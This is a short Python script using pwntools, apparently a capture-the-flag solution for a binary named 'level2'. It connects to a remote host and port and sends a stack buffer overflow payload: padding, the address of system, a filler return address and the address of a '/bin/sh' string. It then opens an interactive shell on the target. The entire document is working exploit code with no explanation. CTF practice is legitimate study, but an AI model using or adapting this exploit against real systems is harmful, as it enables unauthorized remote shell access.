from pwn import *

#sh=process('./level2')
sh=remote('111.198.29.45','32464')
sh.recv()
sys = 0x08048320
bsh =0x0804a024
pay = 'a'*0x8c+p32(sys)+'b'*4+p32(bsh)
sh.sendline(pay)

sh.interactive()
